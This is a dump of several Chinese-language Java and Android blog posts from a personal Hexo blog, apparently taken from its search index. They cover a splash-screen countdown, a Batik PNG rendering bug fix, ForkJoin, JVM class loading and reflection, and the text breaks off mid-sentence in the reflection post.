设置动画开屏使用了一个图片放大的动画，持续3s，动画播放完毕之后跳转主页；所以这里有个有趣的知识点就是如何使用xml来配置动画效果，从实现来看也挺简单的 123456789101112131415161718192021222324// 解析xml配置为 Animation 对象Animation animImage = AnimationUtils.loadAnimation(this, R.anim.image_welcome);// 设置组件的动画属性mBackgroundImage.startAnimation(animImage);// 配置监听事件animImage.setAnimationListener(new Animation.AnimationListener() { @Override public void onAnimationStart(Animation animation) { } // 动画结束后的回调 @Override public void onAnimationEnd(Animation animation) { //动画结束时打开首页 startActivity(new Intent(SplashActivity.this, MainActivity.class)); overridePendingTransition(R.anim.activity_slide_in, R.anim.no_anim); finish(); } @Override public void onAnimationRepeat(Animation animation) { }}); 对应的xml配置如下 image_welcome.xml 1234567891011&lt;set xmlns:android=\"http://schemas.android.com/apk/res/android\"&gt; &lt;scale android:fromXScale=\"1.0\" android:toXScale=\"1.3\" android:fromYScale=\"1.0\" android:toYScale=\"1.3\" android:duration=\"3000\" android:pivotY=\"50%\" android:pivotX=\"50%\" /&gt;&lt;/set&gt; 那么，我们需要实现开头说的，这个图片如果是个广告，点击时展开详情页；右上角显示一个倒计时的小控件，可以怎么处理？（看最后） 4. 页面跳转从一个Activity跳转到另一个，常见的使用姿势如下 1startActivity(new Intent(SplashActivity.this, MainActivity.class)); IV. 倒计时改进如何使用倒计时来替换前面的动画呢？最容易想到的就是用Timer或者ScheduleService来实现一个计时器，当然这是一个后端java的想法，对于Android呢，特意查了一下，发现有个 CountDownTimer 的类，专门干这个的，所以简单的改造一下 12345678910111213141516171819202122232425262728private void initAdBg() { mBackgroundImage = findViewById(R.id.image_background); mBackgroundImage.setImageDrawable(getResources().getDrawable(getBgDrawable())); mBackgroundImage.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View view) { // 点击 Toast.makeText(SplashActivity.this, \"点击了\", Toast.LENGTH_SHORT).show(); } }); final TextView countDown = findViewById(R.id.splash_timedown); CountDownTimer timer = new CountDownTimer(10000, 1000) { @Override public void onTick(long l) { countDown.setText(\"倒计时:\" + (l / 1000) + \"s\"); } @Override public void onFinish() { //动画结束时打开首页 startActivity(new Intent(SplashActivity.this, MainActivity.class)); overridePendingTransition(R.anim.activity_slide_in, R.anim.no_anim); finish(); } }; timer.start();} 改造后的输出图, 注意右上角的时间，已经下面分割处，不会有前面的空白了 V. 其他额外话感觉最近不太能专心下来学习一门技术，有点浮躁了，所以决定学习下andorid，锻炼下自己，初步规划，先入门，然后接收一些有趣的第三方框架，最后再试一下kotalin Android学习第一天，总感觉这将是个漫长的过程，也不晓得最终会完成得怎么样，努力坚持吧 扫描关注，java分享","link":"/hexblog/2018/01/22/Android学习之旅1D-首屏页的开发/"},{"title":"Batik渲染png图片异常的bug修复","text":"Batik渲染png图片异常的bug修复batik是apache的一个开源项目，可以实现svg的渲染，后端借助它可以比较简单的实现图片渲染，当然和java一贯处理图片不太方便一样，使用起来也有不少坑 下面记录一个bug的修复过程 I. 问题重现svg文件: 123456&lt;svg width=\"200\" height=\"200\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"&gt;&lt;image y=\"0\" width=\"100%\" height=\"100%\" x=\"0\" xlink:href=\"http://image.uc.cn/o/wemedia/s/upload/2017/39c53604fe3587a4876396cf3785b801x200x200x13.png\"/&gt; &lt;!--xlink:href=\"https://s17.mogucdn.com/mlcdn/c45406/180119_46ld8kkb54d3el06hela5d61e18f5_1024x966.png\"/&gt;--&gt; &lt;!--xlink:href=\"http://avatar.csdn.net/A/8/B/3_u010889145.jpg\"/&gt;--&gt;&lt;/svg&gt; 依次测试了三个图片，两个png，一个jpg，很不幸第一个png会抛异常 输出的堆栈信息如 12345678910111213141516The URI \"http://image.uc.cn/o/wemedia/s/upload/2017/39c53604fe3587a4876396cf3785b801x200x200x13.png\"on element &lt;image&gt; can't be opened because:PNG URL is corrupt or unsupported variant at org.apache.batik.bridge.UserAgentAdapter.getBrokenLinkDocument(UserAgentAdapter.java:448) at org.apache.batik.bridge.SVGImageElementBridge.createRasterImageNode(SVGImageElementBridge.java:642) at org.apache.batik.bridge.SVGImageElementBridge.createImageGraphicsNode(SVGImageElementBridge.java:340) at org.apache.batik.bridge.SVGImageElementBridge.buildImageGraphicsNode(SVGImageElementBridge.java:180) at org.apache.batik.bridge.SVGImageElementBridge.createGraphicsNode(SVGImageElementBridge.java:122) at org.apache.batik.bridge.GVTBuilder.buildGraphicsNode(GVTBuilder.java:213) at org.apache.batik.bridge.GVTBuilder.buildComposite(GVTBuilder.java:171) at org.apache.batik.bridge.GVTBuilder.build(GVTBuilder.java:82) at org.apache.batik.transcoder.SVGAbstractTranscoder.transcode(SVGAbstractTranscoder.java:208) at org.apache.batik.transcoder.image.ImageTranscoder.transcode(ImageTranscoder.java:92) at org.apache.batik.transcoder.XMLAbstractTranscoder.transcode(XMLAbstractTranscoder.java:142) at org.apache.batik.transcoder.SVGAbstractTranscoder.transcode(SVGAbstractTranscoder.java:156) ... II. 问题定位及分析既然出现了这个问题，那么就要去修复解决了，当然遇到这么鬼畜的问题，最常见的几个步骤： 其他人遇到过么 （问百度） – 结果度娘没有给出任何有效的建议，也没有搜到任何有用的信息 然后问谷歌，靠谱了一点，至少有些相关的主题了，但建设性的意见也没收到 外援实在找不到，只能debug查问题了 1. DEBUG的一路通过上面的堆栈信息，可以想见，debug的几个地方也和明确了，首先定位到下面这一行 1at org.apache.batik.bridge.UserAgentAdapter.getBrokenLinkDocument(UserAgentAdapter.java:448) 为什么这么干？因为首先得确认下这个异常是怎么抛出来的，逆向推，直接看源码，发现直接抛出异常 再往上走 1at org.apache.batik.bridge.SVGImageElementBridge.createRasterImageNode(SVGImageElementBridge.java:642) 所以说因为这个if条件判断成立，导致进入了这个异常逻辑，判断的逻辑也没啥好说的，现在的关键是这个参数对象img是怎么来的 1at org.apache.batik.bridge.SVGImageElementBridge.createImageGraphicsNode(SVGImageElementBridge.java:340) 然后就稍微清晰一点了，直接将火力放在下面的方法中 12345org.apache.batik.ext.awt.image.spi.ImageTagRegistry#readURL(java.io.InputStream, org.apache.batik.util.ParsedURL, org.apache.xmlgraphics.java2d.color.ICCColorSpaceWithIntent, boolean, boolean) 在这个方法内部，也没什么好说的，单步多调几次，就能发现异常的case是怎么来的了，省略掉中间各种单步debug的过程，下面直接进入关键链路 2. 火力全开，问题定位1org.apache.batik.ext.awt.image.codec.imageio.AbstractImageIORegistryEntry 通过上面的一路之后，发现最终的关键就是上面这个抽象类，顺带也可以看下这个抽象类的几个子类，有JPEGxxx, PNGxxx, TIFFxxx，然后问题来了，都已经有相关实现了，所以png讲道理应该是会支持的才对吧，但和实际的表现太不一样了吧，所以有必要撸一把源码了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273public Filter handleStream(InputStream inIS, ParsedURL origURL, boolean needRawData) { final DeferRable dr = new DeferRable(); final InputStream is = inIS; final String errCode; final Object [] errParam; if (origURL != null) { errCode = ERR_URL_FORMAT_UNREADABLE; errParam = new Object[] {getFormatName(), origURL}; } else { errCode = ERR_STREAM_FORMAT_UNREADABLE; errParam = new Object[] {getFormatName()}; } Thread t = new Thread() { @Override public void run() { Filter filt; try{ Iterator&lt;ImageReader&gt; iter = ImageIO.getImageReadersByMIMEType( getMimeTypes().get(0).toString()); if (!iter.hasNext()) { throw new UnsupportedOperationException( \"No image reader for \" + getFormatName() + \" available!\"); } ImageReader reader = iter.next(); ImageInputStream imageIn = ImageIO.createImageInputStream(is); reader.setInput(imageIn, true); int imageIndex = 0; dr.setBounds(new Rectangle2D.Double (0, 0, reader.getWidth(imageIndex), reader.getHeight(imageIndex))); CachableRed cr; //Naive approach possibly wasting lots of memory //and ignoring the gamma correction done by PNGRed :-( //Matches the code used by the former JPEGRegistryEntry, though. BufferedImage bi = reader.read(imageIndex); cr = GraphicsUtil.wrap(bi); cr = new Any2sRGBRed(cr); cr = new FormatRed(cr, GraphicsUtil.sRGB_Unpre); WritableRaster wr = (WritableRaster)cr.getData(); ColorModel cm = cr.getColorModel(); BufferedImage image = new BufferedImage (cm, wr, cm.isAlphaPremultiplied(), null); cr = GraphicsUtil.wrap(image); filt = new RedRable(cr); } catch (IOException ioe) { // Something bad happened here... filt = ImageTagRegistry.getBrokenLinkImage (AbstractImageIORegistryEntry.this, errCode, errParam); } catch (ThreadDeath td) { filt = ImageTagRegistry.getBrokenLinkImage (AbstractImageIORegistryEntry.this, errCode, errParam); dr.setSource(filt); throw td; } catch (Throwable t) { filt = ImageTagRegistry.getBrokenLinkImage (AbstractImageIORegistryEntry.this, errCode, errParam); } dr.setSource(filt); } }; t.start(); return dr;} 看上面的实现是一个非常有意思的事情， 开了一个线程做事情，而且直接就返回了，相当于给了别人一个储物箱的钥匙，虽然现在储物箱是空的，但是回头我会填满的 言归正传，主要的业务逻辑就在这个线程里了，核心的几行代码就是 123456789101112// 加载图片，转为BufferedImage对象BufferedImage bi = reader.read(imageIndex);cr = GraphicsUtil.wrap(bi);// 下面实现对图片的ARGB进行修改cr = new Any2sRGBRed(cr);cr = new FormatRed(cr, GraphicsUtil.sRGB_Unpre);WritableRaster wr = (WritableRaster)cr.getData();ColorModel cm = cr.getColorModel();BufferedImage image = new BufferedImage (cm, wr, cm.isAlphaPremultiplied(), null);cr = GraphicsUtil.wrap(image);filt = new RedRable(cr); debug上面的几行代码，发现问题比较明显了，就是这个图片的转换跪了，至于为啥？ java的图片各种蛋疼至极，这里面的逻辑，真心搞不进去，so深挖到此为止 III. 兼容逻辑问题定位到了，当然就是想办法来修复了，简单来说，需要兼容的就是图片的类型转换上了，直接用原来的可能会抛异常，所以做了一个简单的兼容逻辑 12345678910111213141516if(bi.getType() == BufferedImage.TYPE_BYTE_INDEXED) { BufferedImage image = new BufferedImage(bi.getWidth(), bi.getHeight(), BufferedImage.TYPE_INT_ARGB); Graphics2D g2d = image.createGraphics(); g2d.drawImage(bi, 0, 0, null); g2d.dispose(); cr = GraphicsUtil.wrap(image);} else { cr = GraphicsUtil.wrap(bi); cr = new Any2sRGBRed(cr); cr = new FormatRed(cr, GraphicsUtil.sRGB_Unpre); WritableRaster wr = (WritableRaster)cr.getData(); ColorModel cm = cr.getColorModel(); BufferedImage image = new BufferedImage (cm, wr, cm.isAlphaPremultiplied(), null); cr = GraphicsUtil.wrap(image);} 再次验证，ok 注意： 一个问题来了，上面的兼容是需要修改源码的，我们可以怎么办？有几种解决方法 猥琐方法一：down下源码，修改版本，然后传到自己的私服，使用自己的vip包 猥琐方法二：把 batik-codec 工程原样拷贝到自己的项目中，就可以随意的使用改了 猥琐方法三：写一个完全相同的类（包路径完全相同），然后构造一个自定义类加载器，加载这个自己的这个兼容版本的，替换原来的（未测试，不确定是否能行） 至于我的选择，就是使用了猥琐方法二 IV. 其他声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见解不全，如有问题，欢迎批评指正 扫描关注，java分享","link":"/hexblog/2018/01/20/Batik渲染png图片异常的bug修复/"},{"title":"ForkJoin 学习使用笔记","text":"ForkJoin 学习使用笔记 Fork/Join框架是Java7提供了的一个用于并行执行任务的框架， 是一个把大任务分割成若干个小任务，最终汇总每个小任务结果后得到大任务结果的框架 I. 背景在日常的业务需求中，经常出现的批量查询，批量写入等接口的提供，一般来说，最简单最low的方式就是写一个for循环来一次执行，但是当业务方对接口的性能要求较高时，就比较尴尬了 通常可以想到的方式是采用并发操作，首先想到可以实现的方式就是利用线程池来做 通常实现方式如下 12345678910111213141516171819202122// 1. 创建线程池ExecutorService executorService = new ThreadPoolExecutor(3, 5, 60, TimeUnit.SECONDS, new LinkedBlockingDeque&lt;Runnable&gt;(10), new DefaultThreadFactory(\"biz-exec\"), new ThreadPoolExecutor.CallerRunsPolicy());// 2. 创建执行任务List&lt;Future&lt;Object&gt;&gt; futureList = new ArrayList&lt;&gt;();for(Object arg : list) { futureList.add(executorService.submit(new Callable&lt;Object&gt;() { @Override public Object call() throws Exception { // xxx } }));}// 3. 结果获取for(Future f: futureList) { Object obj = f.get();} 用上面的这种方式并没有什么问题，我们接下来考虑的是如何使用ForkJoin框架来实现类似的功能 II. ForkJoin 基本知识 Fork: 将大任务拆分成若干个可以并发执行的小任务 Join: 合并所有小任务的执行结果 1. 任务分割ForkJoinTask : 基本任务，使用forkjoin框架必须创建的对象，提供fork,join操作，常用的两个子类 RecursiveAction : 无结果返回的任务 RecursiveTask : 有返回结果的任务 说明： fork : 让task异步执行 join : 让task同步执行，可以获取返回值 ForkJoinTask 在不显示使用ForkJoinPool.execute/invoke/submit()方法进行执行的情况下，也可以使用自己的fork/invoke方法进行执行 2. 结果合并ForkJoinPool 执行 ForkJoinTask， 任务分割出的子任务会添加到当前工作线程所维护的双端队列中，进入队列的头部。 当一个工作线程的队列里暂时没有任务时，它会随机从其他工作线程的队列的尾部获取一个任务 三中提交方式： execute 异步，无返回结果 submit 异步，有返回结果 （返回Future&lt;T&gt;） invoke 同步，有返回结果 （会阻塞） III. 使用说明 结合两个场景，给出使用姿势 1. 累加 实现从 start - end 的累加求和 首先是定义一个CountTask 来实现求和 首先是确定任务分割的阀值，当 end-start 的差值大于阀值时，将任务一分为二 1234567891011121314151617181920212223242526272829303132333435public class CountTask extends RecursiveTask&lt;Integer&gt; { private int start; private int end; private static final int THRED_HOLD = 30; public CountTask(int start, int end) { this.start = start; this.end = end; } @Override protected Integer compute() { int sum = 0; boolean canCompute = (end - start) &lt;= THRED_HOLD; if (canCompute) { // 不需要拆分 for (int i = start; i &lt;= end; i++) { sum += i; } System.out.println(\"thread: \" + Thread.currentThread() + \" start: \" + start + \" end: \" + end); } else { int mid = (end + start) / 2; CountTask left = new CountTask(start, mid); CountTask right = new CountTask(mid + 1, end); left.fork(); right.fork(); sum = left.join() + right.join(); } return sum; }} 调用case 1234567891011@Testpublic void testFork() throws ExecutionException, InterruptedException { int start = 0; int end = 200; CountTask task = new CountTask(start, end); ForkJoinPool pool = ForkJoinPool.commonPool(); Future&lt;Integer&gt; ans = pool.submit(task); int sum = ans.get(); System.out.println(sum);} 输出结果： 123456789thread: Thread[ForkJoinPool.commonPool-worker-0,5,main] start: 51 end: 75thread: Thread[ForkJoinPool.commonPool-worker-3,5,main] start: 101 end: 125thread: Thread[ForkJoinPool.commonPool-worker-1,5,main] start: 0 end: 25thread: Thread[ForkJoinPool.commonPool-worker-3,5,main] start: 126 end: 150thread: Thread[ForkJoinPool.commonPool-worker-0,5,main] start: 76 end: 100thread: Thread[ForkJoinPool.commonPool-worker-3,5,main] start: 151 end: 175thread: Thread[ForkJoinPool.commonPool-worker-1,5,main] start: 26 end: 50thread: Thread[ForkJoinPool.commonPool-worker-3,5,main] start: 176 end: 20020100 2. 排序 int 数组进行排序 同样先定义一个SortTask, 主要是为了演示ForkJoin的使用姿势，具体的排序和合并的逻辑比较简陋的实现了一下（这块不是重点） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455public class SortTask extends RecursiveTask&lt;List&lt;Integer&gt;&gt; { private List&lt;Integer&gt; list; private final static int THRESHOLD = 5; public SortTask(List&lt;Integer&gt; list) { this.list = list; } @Override protected List&lt;Integer&gt; compute() { if (list.size() &lt; THRESHOLD) { Collections.sort(list); System.out.println(\"thread: \" + Thread.currentThread() + \" sort: \" + list); return list; } int mid = list.size() &gt;&gt; 1; SortTask l = new SortTask(list.subList(0, mid)); SortTask r = new SortTask(list.subList(mid, list.size())); l.fork(); r.fork(); List&lt;Integer&gt; left = l.join(); List&lt;Integer&gt; right = r.join(); return merge(left, right); } private List&lt;Integer&gt; merge(List&lt;Integer&gt; left, List&lt;Integer&gt; right) { List&lt;Integer&gt; result = new ArrayList&lt;&gt;(left.size() + right.size()); int rightIndex = 0; for (int i = 0; i &lt; left.size(); i++) { if (rightIndex &gt;= right.size() || left.get(i) &lt;= right.get(rightIndex)) { result.add(left.get(i)); } else { result.add(right.get(rightIndex++)); i -= 1; } } if (rightIndex &lt; right.size()) { result.addAll(right.subList(rightIndex, right.size())); } return result; }} 测试case和上面基本一样，我们改用 invoke 替换上面的 submit 12345678@Testpublic void testMerge() throws ExecutionException, InterruptedException { List&lt;Integer&gt; list = Arrays.asList(100, 200, 150, 123, 4512, 3414, 3123, 34, 5412, 34, 1234, 893, 213, 455, 6, 123, 23); SortTask sortTask = new SortTask(list); ForkJoinPool pool = ForkJoinPool.commonPool(); List&lt;Integer&gt; ans = pool.invoke(sortTask); System.out.println(ans);} 输出结果 123456thread: Thread[ForkJoinPool.commonPool-worker-0,5,main] sort: [34, 3123, 3414, 4512]thread: Thread[ForkJoinPool.commonPool-worker-1,5,main] sort: [100, 123, 150, 200]thread: Thread[ForkJoinPool.commonPool-worker-3,5,main] sort: [34, 893, 1234, 5412]thread: Thread[ForkJoinPool.commonPool-worker-0,5,main] sort: [213, 455]thread: Thread[ForkJoinPool.commonPool-worker-3,5,main] sort: [6, 23, 123][6, 23, 34, 34, 100, 123, 123, 150, 200, 213, 455, 893, 1234, 3123, 3414, 4512, 5412] IV. 其他参考 聊聊并发（八）——Fork/Join框架介绍 线程池与ForkJoin比较 关于看完ForkJoinPool和ForkJoinTask文章后一些总结 个人博客： Z+|blog基于hexo + github pages搭建的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见识有限，如发现bug或者有更好的建议，随时欢迎批评指正 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2017/09/08/ForkJoin-学习使用笔记/"},{"title":"JVM学习之Java类的加载机制","text":"JVM学习之Java类的加载机制平常我们使用java的多，深入到jvm层的机会却很少，平时若不关注，也不会清楚java文件编译后的class文件是如何被jvm加载到内存，如何进行初始化，如何进行运行的 因此这里主要学习的目标就是class文件的加载，会包含以下内容： 什么是类加载 类加载的过程 什么时候触发类加载 类加载器 双亲委托机制 I. 什么是类的加载简单来讲，类加载就是将class文件中的二进制，读取到内存中，解析其中定义的数据结构，然后在运行时方法区创建对应的数据结构，在堆内创建对应的class对象，而这个class对象，就是封装了对应的数据结构，和相关数据的访问操作方法； 上面的这一段简述中，却包含以下几个点： 1. 加载哪里的class文件？第一步就是要明确的获取到对应的class文件了，jvm支持以下几个case中获取 本地系统 从网络上获取 从数据库(or缓存等第三方存储)中获取 从jar，zip包获取（比如我们依赖的第三方jar，大部分都是这种方式了） 源码编译获取（如我们常用的Groovy脚本，源码方式存在，由GroovyEngine加载时就是源码编译成class文件之后由jvm加载的） 2. 数据结构将class文件加载到内存后，一是在堆内创建class对象，一是在运行时方法区内创建对应的数据结构，具体的数据结构主要应该是类型信息 类的方法代码，变量名，方法名，访问权限，返回值等 类(静态)变量也存储在方法区 这一块有必要在jvm的内存分配中详细的研究下，每个存储区间到底干嘛用的，内部存写啥，先留一个坑位 3. class对象class对象是在堆内创建，反射机制就是主要利用它来实现，通过class对象基本可以完全的操作这个类（包括创建对象，访问成员，调用方法） II. 类加载过程类加载过程主要包括： 加载 -&gt; 验证 -&gt; 准备 -&gt; 解析 -&gt; 初始化 -&gt; 使用 -&gt; 卸载 用一张图来表示整个过程，且会带上每个过程主要干嘛用的 1. 加载加载作为类加载的第一个过程，主要就是将class文件代表的二进制，加载到内存中 获取class对应的二进制流（可以从任何能获取到的地方读取对应的二进制流） 将二进制流的静态存储结构转换为方法区的运行时数据结构 在堆内创建class对象 上面的三个过程中，最灵活的就是获取二进制的过程，可以按照你的实际场景，从各种地方捞出数据 2. 验证主要是验证class文件是否合法，有没有被篡改等，属于连接的一个过程 文件格式验证：魔数校验，jdk版本校验 元数据验证：对字节码描述的信息进行语义分析（注意：对比javac编译阶段的语义分析），以保证其描述的信息符合Java语言规范的要求；例如：这个类是否有父类，除了java.lang.Object之外 字节码验证：通过数据流和控制流分析，确定程序语义是合法的、符合逻辑的。 符号引用验证：确保解析动作能正确执行。 3. 准备简单来说就是准备好静态变量的存储空间，并设置默认值，属于连接的一个过程 正式为类分配内存 为类变量设置默认的初始化值（不执行实际的赋值语句，这里专指基本类型的零值，对象的null） 对static final 变量赋与代码中实际的值 4. 解析简单来讲就是将常量池内的符号引用替换成实际引用，解析动作主要针对类或接口、字段、类方法、接口方法、方法类型、方法句柄和调用点限定符7类符号引用进行，同样属于连接的一个过程 符号引用：是一组符号来描述目标，可以是任何字面量 直接引用：是直接指向目标的指针、相对偏移量或一个间接定位到目标的句柄 5. 初始化为类的静态变量赋予正确的初始值，JVM负责对类进行初始化，主要对类变量进行初始化 准备阶段为类变量赋上了默认值，这里则主要是初始化代码中的赋值，一般而言根据实际定义的顺序进行初始化 a. 初始化步骤 若类没有被加载连接，则优先加载 若父类没有被初始化，则优先初始化父类 执行类的初始化语句（直接赋值，静态代码块） b. 初始化的时机 new创建一个对象时 访问或修改类的静态变量，执行静态方法 反射调用 子类被使用 jvm启动时指定 6. 卸载简单来说就是用完了，收拾线程的过程 程序执行完成 异常 系统层面错误 System.exit() III. 类加载器可以理解为类加载器就是用来加载类的工具，同一个类被不同的类加载器加载之后，也认为他们是不同的 四种类加载器：自定义类加载器，应用类加载器，扩展类加载器，启动类加载器 1. 启动类加载器(BootStrap ClassLoader)源头，根，负责加载存放在JDK\\jre\\lib(JDK代表JDK的安装目录，下同)下，或被-Xbootclasspath参数指定的路径中的，并且能被虚拟机识别的类库（如rt.jar，所有的java.*开头的类均被Bootstrap ClassLoader加载）。启动类加载器是无法被Java程序直接引用的 2. 扩展类加载器（Extension ClassLoader）该加载器由sun.misc.Launcher$ExtClassLoader实现，它负责加载DK\\jre\\lib\\ext目录中，或者由java.ext.dirs系统变量指定的路径中的所有类库（如javax.*开头的类），开发者可以直接使用扩展类加载器 3. 应用类加载器（Application ClassLoader）该类加载器由sun.misc.Launcher$AppClassLoader来实现，它负责加载用户类路径（ClassPath）所指定的类，开发者可以直接使用该类加载器，如果应用程序中没有自定义过自己的类加载器，一般情况下这个就是程序中默认的类加载器。 4. 自定义类加载器（User ClassLoader）自己实现的继承ClassLoader的加载器，可以按照自己的意愿，从某些地方加载类 5.类加载机制 全盘负责 当一个类加载器负责加载某个Class时，该Class所依赖的和引用的其他Class也将由该类加载器负责载入，除非显示使用另外一个类加载器来载入 父类委托 先尝试让父类加载器来加载，当父类做不到时，再自己来做 缓存机制 缓存机制将会保证所有加载过的Class都会被缓存，当程序中需要使用某个Class时，类加载器先从缓存区寻找该Class，只有缓存区不存在，系统才会读取该类对应的二进制数据，并将其转换成Class对象，存入缓存区。这就是为什么修改了Class后，必须重启JVM，程序的修改才会生效 6.类的加载类加载有三种方式： 1、命令行启动应用时候由JVM初始化加载 2、通过Class.forName()方法动态加载 加载class到内存，并执行static块 3、通过ClassLoader.loadClass()方法动态加载 只加载class文件到jvm，在class.newInstance()时，执行static块 IV. 双亲委托双亲委托，就是来了一个类加载，先扔给上面去处理，层层上传，只有上面处理不了时，才自己来决定 有啥好处？ 系统类防止内存中出现多份同样的字节码 保证Java程序安全稳定运行 说明：双亲委托机制是可以被破坏的 V. 其他参考: java类的加载机制 《深入理解Java虚拟机-JVM高级特性与最佳实践》 个人博客： Z+|blog基于hexo + github pages搭建的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见识有限，如发现bug或者有更好的建议，随时欢迎批评指正 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2018/03/13/JVM学习之Java类的加载机制/"},{"title":"JDK学习之反射的使用姿势一览","text":"反射的学习使用 日常的学习工作中，可能用到反射的地方不太多，但看看一些优秀框架的源码，会发现基本上都离不开反射的使用；因此本篇博文将专注下如何使用反射 本片博文布局如下: 反射是什么，有什么用，可以做什么 如何使用反射 实例： 利用反射方式，获取一个类的所有成员变量的name及值 通过反射方式，修改对象的私有成员变量 会通过写一个BeanUtils实现对象的成员变量值拷贝来覆盖上面两个场景 I. 反射定义 指程序可以访问、检测和修改它本身状态或行为的一种能力 直接说定义的话，可能并不能非常清晰的解释说明，结合作用进行描述 反射可以干什么？ 1234在运行时构造任意一个类的对象。在运行时判断任意一个对象所属的类。在运行时判断任意一个类所具有的成员变量和方法。在运行时调用任意一个对象的方法 有了上面四点，基本上你想干嘛就可以干嘛，比如我现在就有下面这个类 1234567891011121314151617181920212223242526272829public class RefectTest extends MyRefect implements IRefect { private static String s1 = \"hello\"; private static int s2 = 100; private int s3 = 200; private boolean ans; protected RefectTest next; public RefectTest() { } public RefectTest(int s3, boolean ans, RefectTest next) { this.s3 = s3; this.ans = ans; this.next = next; } public RefectTest next() { return next; } private int count(int a, int b) { return a + b; }} 现在我有了clz,其赋值语句为 Class clz = RefectTest.class， 那么我可以干啥？ 创建一个 RefectTest 对象 123456// 若有默认构造方法RefectTest instance = clz.newIntance();// 若需要传参数Constructor con = clz.getConstructor(int.class, boolean.class, RefectTest.class);RefectTest instance2 = con.newInstance(10, true, new RefectTest()); 判断父类是否是 MyRefect 12// 判断MyRefect是否为clz的父类boolean ans = MyRefect.class.isAssignableFrom(clz); 获取所有的成员变量 12// 获取所有的成员变量（包括私有的）Field[] fields = clz.getDeclaredFields(); 获取所有的方法 12// 获取所有的成员方法（包括私有方法）Method[] methods = clz.getDeclaredMethods(); 上面给出了可以干些什么，并给了对应的简单示例，引入了几个新的类Constructor, Field, Method， 下面将详细解释这三个类是什么，怎么用 II. 反射的使用努力结合实际的应用场景，给出每种利用反射的实现对应需求的使用姿势，有些场景可能并不是特别贴切，欢迎提出给合适的场景以此进行替换 1. 通过反射创建对象 这是个比较常见的场景，我在使用了自定义注解时，通常会这么晚 应用场景： 我定义了一个校验器的注解ValDot，注解中有个校验规则class对象，如下 1234567891011121314151617public interface ICheckRule { boolean check(Object ... obj);}public class DefaultCheckRule implements ICheckRule { @Override public boolean check(Object... obj) { return false; }}@Retention(RetentionPolicy.RUNTIME)@Target(ElementType.METHOD)public @interface CheckDot { // 校验规则 Class&lt;? extends ICheckRule&gt; check() default DefaultCheckRule.class;} 上面定义了注解和校验条件，接着进入整体，在切面中，需要获取 1234567891011121314@Aspect@Componentpublic class CheckAspect { @Before(\"@annotation(checkDot)\") public void process(JoinPoint joinPoint, CheckDot checkDot) throws IllegalAccessException, InstantiationException { // 注意，这里获取注解上的校验规则类，并获取实例 ICheckRule rule = checkDot.check().newInstance(); if(rule.check(joinPoint.getArgs())) { throw new IllegalStateException(\"check argument error!\"); } }} 上面是一个较好的利用反射获取实例的应用场景，想一想，如果不用反射，这个校验规则怎么传进来呢，这个时候就没那么方便了（当然也不是不可以，最简单的就是拿一个Holder持有类名到类对象的映射关系，然后在注解中传类名，也可以达到上面的效果） 还有一种场景可能就比较蛋疼了，如果一个类没有默认构造方法，通过反射就没法直接用class.newInstanace()了 Constructor构造器类 根据Class优先获取到 Constructor 对象，然后传入需要的构造参数, 测试如下 1234567891011121314151617181920212223public class ConTest { private int a,b; public ConTest(int a, int b) { this.a = a; this.b = b; } @Override public String toString() { return \"ConTest{\" + \"a=\" + a + \", b=\" + b + '}'; } public static void main(String[] args) throws Exception { Class clz = ConTest.class; // 获取对应的构造器（注意参数类型） Constructor constructor = clz.getConstructor(int.class, int.class); // 创建实例（注意参数要匹配） ConTest test = (ConTest) constructor.newInstance(10, 20); System.out.println(test.toString()); }} 输出 1ConTest{a=10, b=20} 一般常用下面四种方式获取 1234567891011// 根据参数类型获取匹配的构造器Constructor getConstructor(Class[] params)// 获取所有的Constructor[] getConstructors()// 相比较前面的，这里可以获取私有方法Constructor getDeclaredConstructor(Class[] params)// 可以获取私有方法Constructor[] getDeclaredConstructors() 2. 判断class的继承关系判断是否为基础数据类型基本类型较为特殊，所以JDK很人性化的给封装了一个方法，Class#isPrimitive 因此返回true的类型有: int long short byte char boolean 封装后的类型，返回的依然是false 附带一句，是没有null.class这种用法的 判断是否为另一个类的子类，另一个接口的实现类通常我们利用 instanceof 关键字来判断继承关系，但是这个是针对对象来的，现在给一个class，要怎么玩？ 看下面，主要就是 Class#isAssignableFrom() 的功劳了 1234567891011121314151617181920212223public class ExtendTest { interface ITest {} abstract class ATest { abstract public void print(); } class TestClz extends ATest implements ITest { @Override public void print() { System.out.println(\"TestClz\"); } } public static void main(String[] args) { Class clz = TestClz.class; System.out.println(ATest.class.isAssignableFrom(clz)); System.out.println(ITest.class.isAssignableFrom(clz)); }} 需要注意一点，父类作为调用方，子类作为参数 结合泛型时，获取泛型的实际类型泛型，又是一个有意思的功能，这里不多说，继承一个泛型基类，然后问题是如何通过反射获得泛型签名中的类型，一般会在继承或实现泛型接口时会用到它。 123456789class A&lt;T, ID&gt; {}class B extends A&lt;String, Integer&gt; {}public static void main(String[] args) { System.out.println(B.class.getGenericSuperclass());} 换成泛型接口呢 ? 12345678910111213interface A&lt;T, ID&gt; { } class B implements A&lt;String, Integer&gt; { }public static void main(String[] args) { ParameterizedType parameterizedType = (ParameterizedType) B.class.getGenericInterfaces()[0]; Type[] actualTypeArguments = parameterizedType.getActualTypeArguments(); for (Type actualTypeArgument : actualTypeArguments) { System.out.println(actualTypeArgument); }} 3. 获取成员变量获取成员变量，主要是根据 B.class.getDeclaredFields() 来获取所有声明的变量，这个应用场景会和下面的获取方法并执行联合一起说明 1234567891011// 获取指定的公共成员变量Field getField(String name)// 获得所有公共字段Field[] getFields()// 获取指定声明的成员变量（包括prive）Field getDeclaredField(String name)// 获取所有声明的成员变量Field[] getDeclaredFields() 这个主要返回 Field对象，现在有了Field，可以做些啥？ 判断成员的修饰 Field#getModifiers() 12345678int modify = field.getModifiers();// 是否是静态变量boolean ans = Modifier.isStatic(modifier);// 是否是公共变量boolean ans = Modifier.isPublic(modifier);// 是否不可变boolean ans = 